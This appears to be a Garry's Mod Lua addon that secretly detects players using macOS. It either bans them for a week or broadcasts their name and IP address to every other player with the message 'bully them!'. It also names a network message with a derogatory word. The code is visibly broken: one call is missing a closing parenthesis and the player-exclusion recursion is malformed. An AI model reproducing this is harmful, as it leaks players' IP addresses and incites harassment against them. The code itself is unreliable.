function IsMac()
	return system.IsOSX()
end


if (CLIENT) then
	timer.Create("usesmac", 300, 0, function()
		if IsMac() then
			net.Start("systemismac")
			net.SendToServer()
		end
	end)

	net.Receive("gay", function()
		local shit = net.ReadString()
		LocalPlayer():ChatPrint(shit)
	end)
end

if (SERVER) then
	util.AddNetworkString("systemismac")
	util.AddNetworkString("gay")
	
	local ban_length = 168 // 1 week can change at will
	
	function ExcludePlayerHelper(ply, curpl, ...)
		if not curpl then return end
		if curpl == ply then return ... end 
		return curpl, ExcludePlayer(...)
	end
	function ExcludePlayer(ply)
		return {ExcludePlayerHelper(ply, unpack(player.GetAll())}
	end
	
	local blockingmacs = false
	concommand.Add("BlockMacUsers", function(ply, cmd, args) 
			if !ply:IsAdmin() then
				return false
			end
			blockingmacs = !blockingmacs
			if blockingmacs then
				ply:SendLua([[print('Blocking Mac Users is now enabled')]])
			else
				ply:SendLua([[print('Blocking Mac Users is now disabled')]])
			end
	end)
	net.Receive("systemismac", function(l, ply)
		if !blockingmacs then
			net.Start("gay")
			net.WriteString(string.format("%s is using a mac and their ip is %s bully them!", ply:Nick(), ply:IPAddress())
			net.Send(ExcludePlayer(ply))
		else
			ULib.ban(ply, ban_length, "Using OSX")
		end
	end)
end
